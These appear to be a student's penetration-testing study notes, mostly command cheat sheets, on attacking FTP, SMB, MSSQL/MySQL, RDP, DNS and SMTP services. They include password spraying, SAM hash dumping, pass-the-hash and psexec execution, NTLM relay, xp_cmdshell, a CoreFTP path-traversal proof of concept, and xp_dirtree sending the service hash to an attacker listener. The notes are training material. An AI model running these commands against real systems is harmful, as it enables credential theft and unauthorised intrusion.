# Attacking Common Services

> Status: 🟨 In progress (section 1 of 19 audited; attack sections already covered)
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Attack the services found in almost every network (FTP, SMB, SQL, RDP, DNS, SMTP). (Service *enumeration* reference lives in `cheatsheets/service-enumeration.md`; this module is the *attacking* side.)

## Methodology

### SPPD attack model (Source → Process → Privileges → Destination)
A way to reason about any service/app attack as a linear flow:
- **Source** — where input enters (user input, config, API, libraries, code)
- **Process** — how the service handles it (parsing, variables, logging)
- **Privileges** — what access that processing runs with (user/group/policy)
- **Destination** — the outcome (local action, or network/transfer out)

**Log4Shell (CVE-2021-44228) mapped:** Source = crafted `User-Agent` with a JNDI lookup → Process = Log4j evaluates the lookup → Privileges = runs with the logging process's (often high) rights → Destination = fetches a malicious Java class from the attacker = RCE.

### Service misconfigurations (the recurring wins)
- Default creds (`admin:admin`), weak/blank passwords, anonymous auth
- Over-permissive RBAC/ACLs
- Unnecessary enabled features / open ports
- Verbose errors leaking info

**Prevention:** lock down infra, disable unused features/ports, strong passwords, regular scans/audits, a repeatable hardening baseline, patch management, network segmentation, security headers, automated config verification.

### Finding sensitive information (detective mindset)
Everything is loot: usernames, emails, passwords, DNS records, IPs, source code, config files, PII.
- **Where it hides:** file shares (FTP/SMB), email (SMTP), databases (SQL)
- **Process:** understand the service → know what's worth finding for *this* target → use every scrap of info you already have
- **Tools:** nmap, metasploit, sqlmap, `grep`/`find`, custom scripts

> Through-line of the module: every piece of info is valuable, misconfigs leak info and sometimes give RCE, and automation speeds the hunt. SPPD is the lens for *why* an attack works, not just *that* it does.

## Interacting with services (source notes)
Before attacking, know how to connect + hunt for sensitive files.

**SMB — Windows:**
```text
\\<ip>\Finance\                      (WinKey+R, GUI) — no prompt if anon/authed
dir \\<ip>\Finance\                  cmd: list a share
net use n: \\<ip>\Finance            map to drive N:
net use n: \\<ip>\Finance /user:plaintext Password123   with creds
dir n: /a-d /s /b | find /c ":\"     count files (/a-d not dirs, /s recurse, /b bare)
dir n:\*cred* /s /b                  find files by name (cred/password/users/secret/key, *.php/.cs/...)
findstr /s /i cred n:\*.*            find a string inside files
```
```powershell
Get-ChildItem \\<ip>\Finance\                      # (gci) list
New-PSDrive -Name N -Root \\<ip>\Finance -PSProvider FileSystem   # map drive
# with creds:
$p = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential 'plaintext',$p
New-PSDrive -Name N -Root \\<ip>\Finance -PSProvider FileSystem -Credential $cred
(Get-ChildItem -File -Recurse | Measure-Object).Count          # count files
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File          # find by name
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List   # grep-equivalent
```
**SMB — Linux** (needs `sudo apt install cifs-utils`):
```bash
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //<ip>/Finance /mnt/Finance
mount -t cifs //<ip>/Finance /mnt/Finance -o credentials=/path/credfile   # credfile: username=/password=/domain=
find /mnt/Finance/ -name *cred*          # find by name
grep -rn /mnt/Finance/ -ie cred          # find by content
```

**Email clients:** Evolution (`sudo apt-get install evolution`; `export WEBKIT_FORCE_SANDBOX=0 && evolution` if it errors), Thunderbird, Claws, mutt. Point at the mail server's IP/domain; pick TLS (dedicated port) or STARTTLS to match the server.

**Databases — clients:**
```bash
sqsh -S <ip> -U username -P Password123        # MSSQL from Linux
sqlcmd -S <ip> -U username -P Password123       # MSSQL from Windows
mysql -u username -pPassword123 -h <ip>         # MySQL (mysql.exe on Windows)
```
GUI: **dbeaver** (multi-platform, `sudo dpkg -i dbeaver-<ver>.deb` → `dbeaver &`), MySQL Workbench, SSMS (Windows-only, MSSQL).

**Tools by service:** SMB — smbclient, CrackMapExec, SMBMap, Impacket (psexec.py/smbexec.py). FTP — ftp, lftp, ncftp, filezilla, crossftp. Email — Thunderbird, mutt, mailutils, **sendEmail**, **swaks**, sendmail. DB — mssql-cli, mycli, mssqlclient.py, dbeaver, MySQL Workbench, SSMS.

**No access? Check:** authentication · privileges · network connection · firewall rules · protocol support. Use the error code to find docs/forum fixes.

## Per-service attacks

### FTP (TCP/21)
```bash
nmap -sC -sV -p21 <HOST>              # ftp-anon script checks anonymous login
ftp <HOST>                            # anonymous / anonymous (blank pw)
nc <HOST> 21                          # banner
medusa -u <user> -P <list> -h <HOST> -M ftp     # brute (spraying usually better)
```
- **Anonymous access** → read/upload sensitive files.
- **FTP bounce** (misconfig): use the FTP server to scan internal hosts — `nmap -Pn -b anonymous:pass@<FTP> <internal_target>`.
- **CVE-2022-22836 (CoreFTP, <build 727)** — authenticated path traversal / arbitrary file write via HTTP PUT with `../`:
  ```bash
  curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
  ```
- Post-login: `ls cd get mget put mput`. Secure variants: SFTP, FTPS. Servers: vsftpd, proftpd.

### SMB (TCP/445, 139 + UDP/137-138)
```bash
nmap -sV -sC -p139,445 <HOST>
smbclient -N -L //<HOST>              # null session: list shares
smbmap -H <HOST>                      # shares + per-share perms (READ/WRITE/NO ACCESS)
smbmap -H <HOST> -r notes             # browse recursively (-R deeper)
smbmap -H <HOST> --download "notes\note.txt"       # pull a file
smbmap -H <HOST> --upload test.txt "notes\test.txt"  # push a file
rpcclient -U '%' <HOST>               # RPC enum → enumdomusers, querydominfo
enum4linux-ng.py -A -C <HOST>         # comprehensive (wraps nmblookup/net/rpcclient/smbclient)
```
SMB over NetBIOS = port 139 (or non-Windows); direct over TCP = 445. Samba = Unix/Linux SMB; MSRPC rides SMB named pipes.
**Attacks (scope + approval):**
```bash
crackmapexec smb <HOST> -u users.txt -p <pass> --local-auth    # spray
crackmapexec smb <HOST> -u <u> -p <p> --loggedon-users         # who's logged on
crackmapexec smb <HOST> -u <u> -p <p> --sam                    # dump local hashes
crackmapexec smb <HOST> -u <u> -H <NThash>                     # Pass-the-Hash (any Impacket tool/SMBMap/CME)
impacket-psexec <u>:'<p>'@<HOST>                               # RCE → SYSTEM (uploads to ADMIN$, DCE/RPC SCM)
crackmapexec smb <HOST> -u <u> -p <p> -x 'whoami' --exec-method smbexec   # run cmd (-X = PowerShell)
```
- `--continue-on-success` keeps spraying after a hit (one password vs a big user list).
- **Exec methods (Impacket):** `psexec` (RemComSvc on ADMIN$), `smbexec` (no RemComSvc; local SMB server catches output — works with no writable share), `atexec` (Task Scheduler). CME defaults to atexec → falls back to smbexec.
- **Forced auth / hash capture:** `sudo responder -I <iface>` poisons LLMNR/NBT-NS/MDNS → captures NetNTLMv2 (logs in `/usr/share/responder/logs/`) → crack with hashcat `-m 5600` (module 10). Multiple hashes per account = NTLMv2 random challenge salt (same password).
- **Relay** (if uncrackable; set `SMB = Off` in `/etc/responder/Responder.conf` first) — only vs hosts **without SMB signing required**:
  ```bash
  impacket-ntlmrelayx --no-http-server -smb2support -t <target>            # dumps SAM by default
  impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c '<cmd>' # or run a cmd (e.g. base64 PS reverse shell) → catch with nc
  ```
- **RPC post-auth** (config permitting): change a user's password, create a domain user / share (rpcclient).
- **CVE-2020-0796 (SMBGhost)** — SMBv3.1.1 compression flaw, unauth RCE on Win10 1903/1909.

### SQL databases — MSSQL (1433/1434), MySQL (3306)
```bash
nmap -Pn -sV -sC -p1433 <HOST>
mysql -u <u> -p<pass> -h <HOST>                 # MySQL
mssqlclient.py <u>@<HOST> -p 1433               # MSSQL (Impacket)  / sqlcmd / sqsh
```
Enumerate: `SHOW DATABASES;` (MySQL) / `SELECT name FROM master.dbo.sysdatabases; GO` (MSSQL), then tables via `INFORMATION_SCHEMA.TABLES`.
**MSSQL attacks:**
```sql
-- command exec (enable first if needed)
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; GO
xp_cmdshell 'whoami'; GO
-- read local files
SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS c; GO
-- capture the service NetNTLM hash to my SMB listener
EXEC master..xp_dirtree '\\<MY_IP>\share\'; GO     -- catch with responder / impacket-smbserver
-- impersonation + linked servers
EXECUTE AS LOGIN='<user>'; ... REVERT; GO
SELECT srvname,isremote FROM sysservers; GO
EXECUTE('<query>') AT [<linked_server>]; GO
```
**MySQL:** `LOAD_FILE('<path>')` reads files; `INTO OUTFILE '<webroot>/x.php'` **writes** files — writing a PHP file to the webroot = RCE (I don't store the shell payload; note the technique). FILE privilege + known webroot required.

### RDP (TCP/3389)
```bash
nmap -Pn -p3389 <HOST>
crowbar -b rdp -s <HOST>/32 -U users.txt -c <pass>     # spray
hydra -L users.txt -p <pass> <HOST> rdp
xfreerdp /v:<HOST> /u:<u> /p:<p>        # login  (rdesktop also)
xfreerdp /v:<HOST> /u:<u> /pth:<NT_hash>               # Pass-the-Hash (needs Restricted Admin)
```
- **Session hijacking** (SYSTEM): `tscon <session_id> /dest:<our_session>` via a service — documented technique, note it for the report.
- **CVE-2019-0708 (BlueKeep)** — pre-auth UAF RCE on older Windows; unstable (can BSoD).

### DNS (UDP/53, TCP/53)
```bash
nmap -p53 -Pn -sV -sC <HOST>
dig AXFR @<nameserver> <domain>         # zone transfer (misconfig = full records)
fierce --domain <domain>
subfinder -d <domain> -v                # subdomain enum (also sublist3r, subbrute)
host <sub> ; nslookup <sub>             # CNAME checks
```
- **Subdomain takeover:** dangling CNAME → expired third-party service (S3 "NoSuchBucket" etc.); verify with *can-i-take-over-xyz*. Impact: phishing, cookie theft, CORS/CSP abuse.
- **Cache poisoning / spoofing:** MITM with Ettercap/Bettercap (`etter.dns` + `dns_spoof`).

### SMTP / email (25, 465, 587; POP3 110/995; IMAP 143/993)
```bash
nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <HOST>
host -t MX <domain> ; dig mx <domain>        # mail servers
dig txt <domain>                             # SPF/DKIM/DMARC
```
**User enum & attacks:**
```bash
# SMTP verbs: VRFY <user> / EXPN <list> / RCPT TO <user>
smtp-user-enum -M VRFY -U users.txt -D <domain> -t <HOST>
nmap -p25 -Pn --script smtp-open-relay <HOST>        # open relay
swaks --from a@x --to b@y --server <HOST>            # send test / relay check
hydra -L users.txt -P pass.txt <HOST> smtp
# cloud: o365spray / MailSniper (Office365), enum_google (Workspace)
```
- **Spoofing** via manual `telnet <HOST> 25` (HELO/MAIL FROM/RCPT TO/DATA) when no SPF/DKIM/DMARC.
- **CVE-2020-7247 (OpenSMTPD)** unauth RCE; **CVE-2021-27211 (Exim)**. OSINT: theHarvester, Shodan, Censys, Amass.

> Across all six: enumerate → check anon/null/default access → spray (not brute) → abuse the service's own features (xp_cmdshell, OUTFILE, zone transfer, open relay) → capture/relay hashes. SPPD explains each.
